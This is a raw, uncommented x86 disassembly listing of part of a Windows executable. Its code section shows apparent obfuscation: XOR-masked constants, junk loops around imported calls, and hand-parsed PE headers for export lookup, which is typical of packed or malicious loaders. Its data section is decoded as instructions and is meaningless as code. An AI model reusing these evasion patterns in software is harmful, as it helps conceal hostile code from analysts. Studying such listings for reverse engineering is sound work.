  424464:	cmp    DWORD PTR ds:0x42a329,0xa
  42446b:	jne    0x42447f
  424471:	push   0x1979
  424476:	push   DWORD PTR [ebp-0x20]
  424479:	call   DWORD PTR ds:0x42504c
  42447f:	cmp    DWORD PTR ds:0x42a329,0xb
  424486:	jne    0x424497
  42448c:	mov    eax,ds:0x42a329
  424491:	dec    eax
  424492:	mov    ds:0x42a329,eax
  424497:	xor    eax,eax
  424499:	add    eax,DWORD PTR ds:0x42a329
  42449f:	dec    eax
  4244a0:	mov    ds:0x42a329,eax
  4244a5:	jmp    0x424457
  4244aa:	and    DWORD PTR [ebp+0x8],0x0
  4244ae:	mov    eax,DWORD PTR [ebp-0x8]
  4244b1:	sub    eax,DWORD PTR [ebp+0x8]
  4244b4:	or     DWORD PTR ds:0x42a319,0x4a4d
  4244be:	push   eax
  4244bf:	xor    eax,eax
  4244c1:	or     eax,DWORD PTR ds:0x42a3e9
  4244c7:	add    eax,DWORD PTR ds:0x42a35d
  4244cd:	mov    ds:0x42a3e9,eax
  4244d2:	mov    eax,DWORD PTR [ebp-0x4]
  4244d5:	mov    DWORD PTR ds:0x42a2b9,0x3ec0
  4244df:	add    eax,DWORD PTR [ebp+0x8]
  4244e2:	and    DWORD PTR ds:0x42a3e5,0x5545
  4244ec:	push   eax
  4244ed:	or     DWORD PTR ds:0x42a399,0x8f4
  4244f7:	call   0x414e58
  4244fc:	inc    DWORD PTR [ebp+0x8]
  4244ff:	mov    DWORD PTR ds:0x42a2d5,0x53ef
  424509:	cmp    DWORD PTR [ebp+0x8],0x52
  42450d:	jb     0x4244ae
  424513:	jmp    0x4245a5
  424518:	cmp    edi,0x1a2
  42451e:	jne    0x424573
  424524:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  42452b:	mov    eax,DWORD PTR [ebp-0x4]
  42452e:	mov    DWORD PTR [ebp-0x5c],eax
  424531:	mov    eax,DWORD PTR [ebp-0x8]
  424534:	mov    DWORD PTR [ebp-0x58],eax
  424537:	mov    eax,DWORD PTR [ebp-0xc]
  42453a:	xor    eax,esi
  42453c:	add    eax,ebx
  42453e:	mov    DWORD PTR [ebp-0x54],eax
  424541:	lea    eax,[ebp-0x1c]
  424544:	mov    DWORD PTR [ebp-0x50],eax
  424547:	mov    eax,DWORD PTR [ebp-0x60]
  42454a:	xor    eax,esi
  42454c:	add    eax,ebx
  42454e:	mov    DWORD PTR [ebp-0x60],eax
  424551:	lea    eax,[ebp-0x60]
  424554:	push   eax
  424555:	mov    eax,DWORD PTR [ebp+0xc]
  424558:	xor    eax,esi
  42455a:	add    eax,ebx
  42455c:	push   eax
  42455d:	mov    eax,ds:0x426ae2
  424562:	push   0x426a38
  424567:	push   DWORD PTR [eax]
  424569:	call   0x423af0
  42456e:	jmp    0x4245a5
  424573:	cmp    edi,0x13c
  424579:	jne    0x4245a5
  42457f:	mov    eax,DWORD PTR [ebp-0x10]
  424582:	xor    eax,esi
  424584:	add    eax,ebx
  424586:	mov    DWORD PTR [ebp+0x8],eax
  424589:	mov    eax,ds:0x426ac2
  42458e:	mov    DWORD PTR [ebp+0x8],eax
  424591:	mov    eax,DWORD PTR [ebp-0x14]
  424594:	mov    DWORD PTR [ebp-0x4],eax
  424597:	mov    eax,DWORD PTR [ebp-0x4]
  42459a:	push   0x4
  42459c:	pop    ecx
  42459d:	sub    ecx,eax
  42459f:	add    ecx,DWORD PTR [ebp-0x18]
  4245a2:	mov    DWORD PTR [ebp-0x8],ecx
  4245a5:	mov    eax,DWORD PTR [ebp+0xc]
  4245a8:	xor    eax,esi
  4245aa:	lea    edi,[edi+eax*1+0x327298]
  4245b1:	cmp    edi,0x50a
  4245b7:	jne    0x4243e1
  4245bd:	mov    eax,DWORD PTR [ebp+0xc]
  4245c0:	pop    edi
  4245c1:	xor    eax,esi
  4245c3:	pop    esi
  4245c4:	add    eax,ebx
  4245c6:	pop    ebx
  4245c7:	leave  
  4245c8:	ret    0x8
  4245cb:	push   ebp
  4245cc:	mov    ebp,esp
  4245ce:	push   ecx
  4245cf:	xor    edx,edx
  4245d1:	push   ecx
  4245d2:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4245d9:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  4245e0:	and    DWORD PTR ds:0x42a3e5,0x0
  4245ea:	mov    edx,DWORD PTR ds:0x42a3e5
  4245f0:	inc    edx
  4245f1:	mov    DWORD PTR ds:0x42a3e5,edx
  4245f7:	cmp    DWORD PTR ds:0x42a3e5,0xa
  4245fe:	jne    0x424612
  424604:	push   DWORD PTR [ebp-0xc]
  424607:	push   0x42a45b
  42460c:	call   DWORD PTR ds:0x425210
  424612:	cmp    DWORD PTR ds:0x42a3e5,0x9
  424619:	jne    0x42462e
  42461f:	xor    edx,edx
  424621:	or     edx,DWORD PTR ds:0x42a3e5
  424627:	inc    edx
  424628:	mov    DWORD PTR ds:0x42a3e5,edx
  42462e:	cmp    DWORD PTR ds:0x42a3e5,0x17
  424635:	jb     0x4245ea
  42463b:	mov    eax,DWORD PTR [ebp-0x4]
  42463e:	mov    ecx,DWORD PTR ds:0x42a3c1
  424644:	mov    ecx,DWORD PTR [ecx]
  424646:	add    DWORD PTR ds:0x42a3d5,ecx
  42464c:	push   esi
  42464d:	adc    edx,DWORD PTR ds:0x42a2d1
  424653:	mov    esi,DWORD PTR [ebp-0x8]
  424656:	sbb    ecx,DWORD PTR ds:0x42a3ed
  42465c:	mov    edx,0x7510850
  424661:	xor    eax,edx
  424663:	xor    esi,edx
  424665:	mov    ecx,DWORD PTR ds:0x42a2e1
  42466b:	adc    DWORD PTR ds:0x42a39d,ecx
  424671:	mov    ecx,0x327298
  424676:	add    esi,ecx
  424678:	add    eax,ecx
  42467a:	or     DWORD PTR ds:0x42a319,0x45b4
  424684:	imul   eax,esi
  424687:	mov    DWORD PTR ds:0x42a3ad,edi
  42468d:	mov    esi,DWORD PTR [ebp+0xc]
  424690:	cmp    esi,eax
  424692:	mov    DWORD PTR ds:0x42a36d,0x576a
  42469c:	jne    0x4246c0
  4246a2:	not    esi
  4246a4:	mov    eax,DWORD PTR [ebp-0x4]
  4246a7:	xor    esi,0x20ed
  4246ad:	mov    esi,DWORD PTR [ebp-0x8]
  4246b0:	xor    eax,edx
  4246b2:	xor    esi,edx
  4246b4:	add    eax,ecx
  4246b6:	add    esi,ecx
  4246b8:	imul   eax,esi
  4246bb:	jmp    0x4246fb
  4246c0:	mov    eax,DWORD PTR [ebp+0xc]
  4246c3:	mov    eax,DWORD PTR [eax+0x78]
  4246c6:	mov    DWORD PTR [ebp+0xc],eax
  4246c9:	mov    eax,DWORD PTR [ebp-0x4]
  4246cc:	mov    esi,DWORD PTR [ebp-0x8]
  4246cf:	xor    eax,edx
  4246d1:	xor    esi,edx
  4246d3:	add    eax,ecx
  4246d5:	add    esi,ecx
  4246d7:	imul   eax,esi
  4246da:	mov    esi,DWORD PTR [ebp+0xc]
  4246dd:	cmp    esi,eax
  4246df:	mov    eax,DWORD PTR [ebp-0x4]
  4246e2:	je     0x4246a7
  4246e8:	xor    eax,edx
  4246ea:	add    eax,ecx
  4246ec:	mov    ecx,DWORD PTR [ebp+0xc]
  4246ef:	imul   eax,ecx
  4246f2:	add    eax,DWORD PTR [ebp+0x8]
  4246f5:	mov    DWORD PTR [ebp+0xc],eax
  4246f8:	mov    eax,DWORD PTR [ebp+0xc]
  4246fb:	pop    esi
  4246fc:	leave  
  4246fd:	ret    0x8
  424700:	push   ebp
  424701:	mov    ebp,esp
  424703:	mov    eax,ds:0x426b46
  424708:	movzx  edx,BYTE PTR ds:0x42a3d1
  42470f:	or     edx,DWORD PTR ds:0x42a2c5
  424715:	mov    DWORD PTR ds:0x42a3d1,edx
  42471b:	mov    edx,0x327298
  424720:	and    DWORD PTR ds:0x42a351,0x0
  42472a:	xor    ecx,ecx
  42472c:	or     ecx,DWORD PTR ds:0x42a351
  424732:	inc    ecx
  424733:	mov    DWORD PTR ds:0x42a351,ecx
  424739:	cmp    DWORD PTR ds:0x42a351,0x24
  424740:	jne    0x42475e
  424746:	push   0x42a429
  42474b:	push   0x42a4c6
  424750:	push   0x17db
  424755:	push   DWORD PTR [ebp-0x10]
  424758:	call   DWORD PTR ds:0x425050
  42475e:	cmp    DWORD PTR ds:0x42a351,0x1f
  424765:	jb     0x42472a
  42476b:	mov    DWORD PTR ds:0x42a359,0x24e1
  424775:	sub    eax,edx
  424777:	and    DWORD PTR ds:0x42a365,0x0
  424781:	xor    ecx,ecx
  424783:	add    ecx,DWORD PTR ds:0x42a365
  424789:	inc    ecx
  42478a:	mov    DWORD PTR ds:0x42a365,ecx
  424790:	cmp    DWORD PTR ds:0x42a365,0x4
  424797:	jne    0x4247b6
  42479d:	push   0x0
  42479f:	push   DWORD PTR [ebp-0x20]
  4247a2:	push   DWORD PTR [ebp-0x28]
  4247a5:	push   DWORD PTR [ebp-0xc]
  4247a8:	push   DWORD PTR [ebp-0x18]
  4247ab:	push   0x2308
  4247b0:	call   DWORD PTR ds:0x425054
  4247b6:	cmp    DWORD PTR ds:0x42a365,0x3
  4247bd:	jne    0x4247d0
  4247c3:	mov    ecx,DWORD PTR ds:0x42a365
  4247c9:	inc    ecx
  4247ca:	mov    DWORD PTR ds:0x42a365,ecx
  4247d0:	cmp    DWORD PTR ds:0x42a365,0x17
  4247d7:	jb     0x424781
  4247dd:	and    DWORD PTR ds:0x42a329,0x0
  4247e7:	jmp    0x4247f9
  4247ec:	mov    ecx,DWORD PTR ds:0x42a329
  4247f2:	inc    ecx
  4247f3:	mov    DWORD PTR ds:0x42a329,ecx
  4247f9:	cmp    DWORD PTR ds:0x42a329,0x14
  424800:	jae    0x424849
  424806:	cmp    DWORD PTR ds:0x42a329,0x5
  42480d:	jne    0x424829
  424813:	push   0x42a2dd
  424818:	push   0x30ee
  42481d:	push   DWORD PTR [ebp-0x24]
  424820:	push   DWORD PTR [ebp-0x20]
  424823:	call   DWORD PTR ds:0x425388
  424829:	cmp    DWORD PTR ds:0x42a329,0x4
  424830:	jne    0x424844
  424836:	push   DWORD PTR ds:0x42a329
  42483c:	pop    ecx
  42483d:	inc    ecx
  42483e:	mov    DWORD PTR ds:0x42a329,ecx
  424844:	jmp    0x4247ec
  424849:	mov    ecx,0x7510850
  42484e:	push   esi
  42484f:	mov    esi,DWORD PTR [ebp+0xc]
  424852:	xor    eax,ecx
  424854:	cmp    eax,esi
  424856:	je     0x42489d
  42485c:	mov    eax,ds:0x426b3e
  424861:	mov    esi,DWORD PTR [ebp+0xc]
  424864:	sub    eax,edx
  424866:	xor    eax,ecx
  424868:	cmp    eax,esi
  42486a:	jne    0x424880
  424870:	mov    eax,ds:0x426b46
  424875:	add    eax,DWORD PTR ds:0x426b3e
  42487b:	jmp    0x424887
  424880:	mov    eax,DWORD PTR [ebp+0xc]
  424883:	xor    eax,ecx
  424885:	add    eax,edx
  424887:	mov    ds:0x426b3e,eax
  42488c:	mov    eax,DWORD PTR [ebp+0xc]
  42488f:	xor    eax,ecx
  424891:	add    eax,edx
  424893:	mov    ds:0x426b46,eax
  424898:	jmp    0x4248a7
  42489d:	mov    eax,ds:0x426b46
  4248a2:	mov    ds:0x426b3e,eax
  4248a7:	mov    eax,DWORD PTR [ebp+0x8]
  4248aa:	mov    eax,DWORD PTR [eax]
  4248ac:	mov    ecx,DWORD PTR ds:0x426b3e
  4248b2:	add    DWORD PTR [eax],ecx
  4248b4:	pop    esi
  4248b5:	pop    ebp
  4248b6:	ret    0x8
  4248b9:	push   ebp
  4248ba:	mov    ebp,esp
  4248bc:	mov    eax,DWORD PTR [ebp+0xc]
  4248bf:	xor    edx,edx
  4248c1:	mov    ecx,0x7264fd50
  4248c6:	div    ecx
  4248c8:	mov    ecx,DWORD PTR [ebp+0x10]
  4248cb:	and    ecx,eax
  4248cd:	or     ecx,0x81161d8e
  4248d3:	mov    eax,ecx
  4248d5:	pop    ebp
  4248d6:	ret    0x18
  4248d9:	push   ebp
  4248da:	mov    ebp,esp
  4248dc:	sub    esp,0x58
  4248df:	mov    ecx,DWORD PTR [ebp+0x8]
  4248e2:	mov    eax,0x8a36
  4248e7:	or     DWORD PTR ds:0x42a399,0x12b4
  4248f1:	xor    ax,WORD PTR [ecx+0x20]
  4248f5:	xor    DWORD PTR ds:0x42a315,edx
  4248fb:	mov    ecx,0x3afc
  424900:	add    ax,cx
  424903:	movzx  eax,ax
  424906:	mov    DWORD PTR ds:0x42a2cd,0x18
  424910:	cmp    DWORD PTR ds:0x42a2cd,0x0
  424917:	je     0x42494e
  42491d:	cmp    DWORD PTR ds:0x42a2cd,0x1d
  424924:	jne    0x42493a
  42492a:	push   0x787d
  42492f:	push   0x3e83
  424934:	call   DWORD PTR ds:0x425214
  42493a:	xor    ecx,ecx
  42493c:	xor    ecx,DWORD PTR ds:0x42a2cd
  424942:	dec    ecx
  424943:	mov    DWORD PTR ds:0x42a2cd,ecx
  424949:	jmp    0x424910
  42494e:	mov    DWORD PTR [ebp-0xc],eax
  424951:	sbb    DWORD PTR ds:0x42a3a9,edi
  424957:	mov    BYTE PTR [ebp-0x1],0x7f
  42495b:	xor    ecx,ecx
  42495d:	xor    ecx,DWORD PTR ds:0x42a3dd
  424963:	sub    DWORD PTR ds:0x42a2dd,ecx
  424969:	lea    eax,[ebp-0x1]
  42496c:	dec    ecx
  42496d:	mov    DWORD PTR [ebp-0x10],eax
  424970:	adc    DWORD PTR ds:0x42a2c5,ebx
  424976:	mov    al,BYTE PTR [ebp-0x1]
  424979:	mov    ecx,DWORD PTR [ebp-0x10]
  42497c:	xor    al,0x43
  42497e:	sbb    DWORD PTR ds:0x42a3d5,0x194f
  424988:	sub    al,0x3b
  42498a:	mov    BYTE PTR [ecx],al
  42498c:	and    DWORD PTR ds:0x42a3ad,0x0
  424996:	jmp    0x4249a8
  42499b:	mov    ecx,DWORD PTR ds:0x42a3ad
  4249a1:	inc    ecx
  4249a2:	mov    DWORD PTR ds:0x42a3ad,ecx
  4249a8:	cmp    DWORD PTR ds:0x42a3ad,0x19
  4249af:	jae    0x424a26
  4249b5:	cmp    DWORD PTR ds:0x42a3ad,0x1e
  4249bc:	jne    0x4249d2
  4249c2:	push   0x42a3d5
  4249c7:	push   0x40f1
  4249cc:	call   DWORD PTR ds:0x425218
  4249d2:	jmp    0x42499b
  4249d7:	mov    DWORD PTR ds:0x42a39d,0x14
  4249e1:	cmp    DWORD PTR ds:0x42a39d,0x0
  4249e8:	je     0x424a26
  4249ee:	cmp    DWORD PTR ds:0x42a39d,0x23
  4249f5:	jne    0x424a14
  4249fb:	push   DWORD PTR [ebp-0x28]
  4249fe:	push   DWORD PTR [ebp-0x24]
  424a01:	push   0x68e9
  424a06:	push   DWORD PTR [ebp-0x24]
  424a09:	push   0x1ab2
  424a0e:	call   DWORD PTR ds:0x425058
  424a14:	mov    ecx,DWORD PTR ds:0x42a39d
  424a1a:	dec    ecx
  424a1b:	mov    DWORD PTR ds:0x42a39d,ecx
  424a21:	jmp    0x4249e1
  424a26:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  424a2d:	mov    DWORD PTR ds:0x42a2b9,0x1e
  424a37:	cmp    DWORD PTR ds:0x42a2b9,0x0
  424a3e:	je     0x424a93
  424a44:	cmp    DWORD PTR ds:0x42a2b9,0x6
  424a4b:	jne    0x424a65
  424a51:	push   DWORD PTR [ebp-0x24]
  424a54:	push   DWORD PTR [ebp-0x24]
  424a57:	push   0x8937
  424a5c:	push   DWORD PTR [ebp-0x20]
  424a5f:	call   DWORD PTR ds:0x42505c
  424a65:	cmp    DWORD PTR ds:0x42a2b9,0x7
  424a6c:	jne    0x424a7d
  424a72:	mov    eax,ds:0x42a2b9
  424a77:	dec    eax
  424a78:	mov    ds:0x42a2b9,eax
  424a7d:	mov    eax,ds:0x42a2b9
  424a82:	dec    eax
  424a83:	mov    ds:0x42a2b9,eax
  424a88:	jmp    0x424a37
  424a8d:	and    ecx,0x25f3
  424a93:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  424a9a:	adc    DWORD PTR ds:0x42a3e9,edi
  424aa0:	mov    eax,DWORD PTR [ebp-0x8]
  424aa3:	mov    ecx,0x7510850
  424aa8:	or     DWORD PTR ds:0x42a2c9,0x3433
  424ab2:	push   esi
  424ab3:	sbb    DWORD PTR ds:0x42a361,0x5e43
  424abd:	xor    eax,ecx
  424abf:	mov    esi,0x327298
  424ac4:	add    eax,esi
  424ac6:	mov    DWORD PTR ds:0x42a3a5,0x5140
  424ad0:	jmp    0x424af1
  424ad5:	mov    dl,BYTE PTR [ebp-0x1]
  424ad8:	mov    DWORD PTR ds:0x42a3d1,0x4584
  424ae2:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  424ae6:	mov    DWORD PTR ds:0x42a3e1,0x1056
  424af0:	inc    eax
  424af1:	cmp    eax,0x40
  424af4:	jb     0x424ad5
  424afa:	mov    edx,DWORD PTR [ebp-0x8]
  424afd:	mov    eax,DWORD PTR [ebp-0xc]
  424b00:	xor    edx,ecx
  424b02:	add    edx,esi
  424b04:	cmp    edx,eax
  424b06:	je     0x424b4c
  424b0c:	push   ebx
  424b0d:	push   edi
  424b0e:	mov    edi,DWORD PTR [ebp+0x8]
  424b11:	mov    eax,0x8a36
  424b16:	xor    ax,WORD PTR [edi+edx*4+0x2]
  424b1b:	mov    edi,0x3afc
  424b20:	add    ax,di
  424b23:	movzx  eax,ax
  424b26:	mov    DWORD PTR [ebp-0x14],eax
  424b29:	mov    eax,DWORD PTR [ebp+0x8]
  424b2c:	movzx  eax,WORD PTR [eax+edx*4]
  424b30:	xor    eax,0x8a36
  424b35:	add    eax,edi
  424b37:	mov    edi,DWORD PTR [ebp-0x14]
  424b3a:	mov    BYTE PTR [ebp+edi*1-0x58],al
  424b3e:	mov    eax,DWORD PTR [ebp-0xc]
  424b41:	inc    edx
  424b42:	cmp    edx,eax
  424b44:	jne    0x424b0e
  424b4a:	pop    edi
  424b4b:	pop    ebx
  424b4c:	mov    eax,DWORD PTR [ebp-0x8]
  424b4f:	mov    edx,DWORD PTR [ebp+0x10]
  424b52:	xor    eax,ecx
  424b54:	add    eax,esi
  424b56:	mov    DWORD PTR [edx],eax
  424b58:	mov    eax,DWORD PTR [ebp-0x8]
  424b5b:	xor    eax,ecx
  424b5d:	add    eax,esi
  424b5f:	mov    DWORD PTR [ebp+0x8],eax
  424b62:	mov    eax,DWORD PTR [ebp+0x8]
  424b65:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  424b69:	mov    dl,BYTE PTR [ebp-0x1]
  424b6c:	cmp    al,dl
  424b6e:	je     0x424bb1
  424b74:	mov    eax,DWORD PTR [ebp+0x8]
  424b77:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  424b7b:	mov    edx,DWORD PTR [ebp+0xc]
  424b7e:	cmp    al,BYTE PTR [edx]
  424b80:	jne    0x424bd7
  424b86:	mov    eax,DWORD PTR [ebp-0x8]
  424b89:	mov    edx,DWORD PTR [ebp+0xc]
  424b8c:	movsx  edx,BYTE PTR [edx]
  424b8f:	xor    eax,ecx
  424b91:	add    eax,esi
  424b93:	cmp    edx,eax
  424b95:	je     0x424bcb
  424b9b:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  424ba2:	lea    eax,[ebp-0x18]
  424ba5:	mov    DWORD PTR [ebp-0x14],eax
  424ba8:	mov    eax,DWORD PTR [ebp-0x14]
  424bab:	add    DWORD PTR [eax],0x705fa8e
  424bb1:	mov    eax,DWORD PTR [ebp-0x10]
  424bb4:	mov    edx,DWORD PTR [ebp+0x8]
  424bb7:	xor    eax,ecx
  424bb9:	lea    eax,[eax+edx*1+0x327298]
  424bc0:	mov    DWORD PTR [ebp+0x8],eax
  424bc3:	inc    DWORD PTR [ebp+0xc]
  424bc6:	jmp    0x424b62
  424bcb:	mov    eax,DWORD PTR [ebp-0x10]
  424bce:	xor    eax,ecx
  424bd0:	mov    ecx,DWORD PTR [ebp+0x10]
  424bd3:	add    eax,esi
  424bd5:	mov    DWORD PTR [ecx],eax
  424bd7:	pop    esi
  424bd8:	leave  
  424bd9:	ret    0xc
  424bdc:	push   ebp
  424bdd:	mov    ebp,esp
  424bdf:	push   ecx
  424be0:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  424be7:	mov    eax,DWORD PTR [ebp+0x8]
  424bea:	mov    al,BYTE PTR [eax]
  424bec:	add    al,0x3b
  424bee:	xor    al,0x43
  424bf0:	mov    DWORD PTR ds:0x42a2e1,0x5cec
  424bfa:	cmp    al,0xcb
  424bfc:	jne    0x424cae
  424c02:	add    ecx,DWORD PTR ds:0x42a319
  424c08:	mov    eax,DWORD PTR [ebp+0x8]
  424c0b:	mov    DWORD PTR ds:0x42a329,0x1d
  424c15:	cmp    DWORD PTR ds:0x42a329,0x0
  424c1c:	je     0x424c66
  424c22:	cmp    DWORD PTR ds:0x42a329,0xf
  424c29:	jne    0x424c3a
  424c2f:	push   0x29e2
  424c34:	call   DWORD PTR ds:0x425060
  424c3a:	cmp    DWORD PTR ds:0x42a329,0x10
  424c41:	jne    0x424c54
  424c47:	mov    edx,DWORD PTR ds:0x42a329
  424c4d:	dec    edx
  424c4e:	mov    DWORD PTR ds:0x42a329,edx
  424c54:	mov    edx,DWORD PTR ds:0x42a329
  424c5a:	dec    edx
  424c5b:	mov    DWORD PTR ds:0x42a329,edx
  424c61:	jmp    0x424c15
  424c66:	mov    ecx,DWORD PTR [ebp+0x8]
  424c69:	sbb    DWORD PTR ds:0x42a3d1,edx
  424c6f:	add    ecx,DWORD PTR [eax+0x3c]
  424c72:	mov    edx,0x7510850
  424c77:	add    eax,DWORD PTR ds:0x42a311
  424c7d:	mov    DWORD PTR [ebp+0x8],ecx
  424c80:	mov    eax,DWORD PTR [ebp-0x4]
  424c83:	xor    eax,edx
  424c85:	push   esi
  424c86:	mov    esi,DWORD PTR [ebp+0x8]
  424c89:	mov    ecx,0x327298
  424c8e:	add    eax,ecx
  424c90:	cmp    DWORD PTR [esi+0x54],eax
  424c93:	pop    esi
  424c94:	je     0x424ca2
  424c9a:	mov    eax,DWORD PTR [ebp+0x8]
  424c9d:	jmp    0x424cbb
  424ca2:	mov    eax,DWORD PTR [ebp-0x4]
  424ca5:	xor    eax,edx
  424ca7:	add    eax,ecx
  424ca9:	jmp    0x424cbb
  424cae:	mov    eax,DWORD PTR [ebp-0x4]
  424cb1:	xor    eax,0x7510850
  424cb6:	add    eax,0x327298
  424cbb:	leave  
  424cbc:	ret    0x4

Disassembly of section .data:

00425000 <.data>:
  425000:	pop    eax
  425001:	pop    ecx
  425002:	add    al,BYTE PTR [eax]
  425004:	jo     0x42505f
  425006:	add    al,BYTE PTR [eax]
  425008:	test   BYTE PTR [ecx+0x2],bl
  42500b:	add    BYTE PTR [esi-0x55fffda7],dl
  425011:	pop    ecx
  425012:	add    al,BYTE PTR [eax]
  425014:	rcr    BYTE PTR [ecx+0x2],0x0
  425018:	add    BYTE PTR [eax],al
  42501a:	add    BYTE PTR [eax],al
  42501c:	jmp    0x259:0xf8000259
  425023:	add    BYTE PTR [edx+ebx*2],al
  425026:	add    al,BYTE PTR [eax]
  425028:	adc    bl,BYTE PTR [edx+0x2]
  42502b:	add    BYTE PTR [esi],bl
  42502d:	pop    edx
  42502e:	add    al,BYTE PTR [eax]
  425030:	sub    al,0x5a
  425032:	add    al,BYTE PTR [eax]
  425034:	ds pop edx
  425036:	add    al,BYTE PTR [eax]
  425038:	dec    esi
  425039:	pop    edx
  42503a:	add    al,BYTE PTR [eax]
  42503c:	pusha  
  42503d:	pop    edx
  42503e:	add    al,BYTE PTR [eax]
  425040:	ins    BYTE PTR es:[edi],dx
  425041:	pop    edx
  425042:	add    al,BYTE PTR [eax]
  425044:	js     0x4250a0
  425046:	add    al,BYTE PTR [eax]
  425048:	mov    bl,BYTE PTR [edx+0x2]
  42504b:	add    BYTE PTR [esi-0x55fffda6],dl
  425051:	pop    edx
  425052:	add    al,BYTE PTR [eax]
  425054:	mov    edx,0xc800025a
  425059:	pop    edx
  42505a:	add    al,BYTE PTR [eax]
  42505c:	(bad)  
  42505d:	pop    edx
  42505e:	add    al,BYTE PTR [eax]
  425060:	loop   0x4250bc
  425062:	add    al,BYTE PTR [eax]
  425064:	lock pop edx
  425066:	add    al,BYTE PTR [eax]
  425068:	(bad)  
  425069:	pop    edx
  42506a:	add    al,BYTE PTR [eax]
  42506c:	or     bl,BYTE PTR [ebx+0x2]
  42506f:	add    BYTE PTR [edx],bl
  425071:	pop    ebx
  425072:	add    al,BYTE PTR [eax]
  425074:	sub    BYTE PTR [ebx+0x2],bl
  425077:	add    BYTE PTR [ebx+ebx*2],dh
  42507a:	add    al,BYTE PTR [eax]
  42507c:	inc    eax
  42507d:	pop    ebx
  42507e:	add    al,BYTE PTR [eax]
  425080:	push   eax
  425081:	pop    ebx
  425082:	add    al,BYTE PTR [eax]
  425084:	pusha  
  425085:	pop    ebx
  425086:	add    al,BYTE PTR [eax]
  425088:	jb     0x4250e5
  42508a:	add    al,BYTE PTR [eax]
  42508c:	test   BYTE PTR [ebx+0x2],bl
  42508f:	add    BYTE PTR [eax-0x57fffda5],bl
  425095:	pop    ebx
  425096:	add    al,BYTE PTR [eax]
  425098:	mov    ah,0x5b
  42509a:	add    al,BYTE PTR [eax]
  42509c:	(bad)  
  42509d:	pop    ebx
  42509e:	add    al,BYTE PTR [eax]
  4250a0:	rcr    BYTE PTR [ebx+0x2],cl
  4250a3:	add    dh,bl
  4250a5:	pop    ebx
  4250a6:	add    al,BYTE PTR [eax]
  4250a8:	out    dx,al
  4250a9:	pop    ebx
  4250aa:	add    al,BYTE PTR [eax]
  4250ac:	cld    
  4250ad:	pop    ebx
  4250ae:	add    al,BYTE PTR [eax]
  4250b0:	push   cs
  4250b1:	pop    esp
  4250b2:	add    al,BYTE PTR [eax]
  4250b4:	push   ds
  4250b5:	pop    esp
  4250b6:	add    al,BYTE PTR [eax]
  4250b8:	cs pop esp
  4250ba:	add    al,BYTE PTR [eax]
  4250bc:	inc    eax
  4250bd:	pop    esp
  4250be:	add    al,BYTE PTR [eax]
  4250c0:	dec    esp
  4250c1:	pop    esp
  4250c2:	add    al,BYTE PTR [eax]
  4250c4:	pop    sp
  4250c6:	add    al,BYTE PTR [eax]
  4250c8:	jbe    0x425126
  4250ca:	add    al,BYTE PTR [eax]
  4250cc:	mov    ds,WORD PTR [edx+eax*1+0x0]
  4250d0:	mov    ds:0xb000025c,al
  4250d5:	pop    esp
  4250d6:	add    al,BYTE PTR [eax]
  4250d8:	ret    0x25c
  4250db:	add    dh,dl
  4250dd:	pop    esp
  4250de:	add    al,BYTE PTR [eax]
  4250e0:	jmp    0x25c:0xfc00025c
  4250e7:	add    BYTE PTR [edx],cl
  4250e9:	pop    ebp
  4250ea:	add    al,BYTE PTR [eax]
  4250ec:	sbb    al,0x5d
  4250ee:	add    al,BYTE PTR [eax]
  4250f0:	sub    bl,BYTE PTR [ebp+0x2]
  4250f3:	add    BYTE PTR [edx],bh
  4250f5:	pop    ebp
  4250f6:	add    al,BYTE PTR [eax]
  4250f8:	dec    esi
  4250f9:	pop    ebp
  4250fa:	add    al,BYTE PTR [eax]
  4250fc:	fs pop ebp
  4250fe:	add    al,BYTE PTR [eax]
  425100:	jbe    0x42515f
  425102:	add    al,BYTE PTR [eax]
  425104:	test   BYTE PTR [ebp+0x2],bl
  425107:	add    BYTE PTR [ebp+ebx*2+0x5da20002],dl
  42510e:	add    al,BYTE PTR [eax]
  425110:	rcr    BYTE PTR [ebp+0x2],0x0
  425114:	into   
  425115:	pop    ebp
  425116:	add    al,BYTE PTR [eax]
  425118:	ficomp DWORD PTR [ebp+0x2]
  42511b:	add    ah,ch
  42511d:	pop    ebp
  42511e:	add    al,BYTE PTR [eax]
  425120:	cli    
  425121:	pop    ebp
  425122:	add    al,BYTE PTR [eax]
  425124:	push   es
  425125:	pop    esi
  425126:	add    al,BYTE PTR [eax]
  425128:	push   ds
  425129:	pop    esi
  42512a:	add    al,BYTE PTR [eax]
  42512c:	cs pop esi
  42512e:	add    al,BYTE PTR [eax]
  425130:	cmp    bl,BYTE PTR [esi+0x2]
  425133:	add    BYTE PTR [edx+0x5e],cl
  425136:	add    al,BYTE PTR [eax]
  425138:	fs pop esi
  42513a:	add    al,BYTE PTR [eax]
  42513c:	jp     0x42519c
  42513e:	add    al,BYTE PTR [eax]
  425140:	mov    BYTE PTR [esi+0x2],bl
  425143:	add    BYTE PTR [edx-0x4dfffda2],bl
  425149:	pop    esi
  42514a:	add    al,BYTE PTR [eax]
  42514c:	ret    0x25e
  42514f:	add    al,dl
  425151:	pop    esi
  425152:	add    al,BYTE PTR [eax]
  425154:	jmp    0x25e:0xfa00025e
  42515b:	add    BYTE PTR [esi],cl
  42515d:	pop    edi
  42515e:	add    al,BYTE PTR [eax]
  425160:	sbb    bl,BYTE PTR [edi+0x2]
  425163:	add    BYTE PTR [edx],ch
  425165:	pop    edi
  425166:	add    al,BYTE PTR [eax]
  425168:	cmp    bl,BYTE PTR [edi+0x2]
  42516b:	add    BYTE PTR [edx+0x5f],cl
  42516e:	add    al,BYTE PTR [eax]
  425170:	pusha  
  425171:	pop    edi
  425172:	add    al,BYTE PTR [eax]
  425174:	jb     0x4251d5
  425176:	add    al,BYTE PTR [eax]
  425178:	mov    BYTE PTR [edi+0x2],bl
  42517b:	add    BYTE PTR [edi+ebx*2+0x5fa40002],dl
  425182:	add    al,BYTE PTR [eax]
  425184:	mov    dl,0x5f
  425186:	add    al,BYTE PTR [eax]
  425188:	rcr    BYTE PTR [edi+0x2],0x0
  42518c:	rcr    BYTE PTR [edi+0x2],cl
  42518f:	add    dh,ah
  425191:	pop    edi
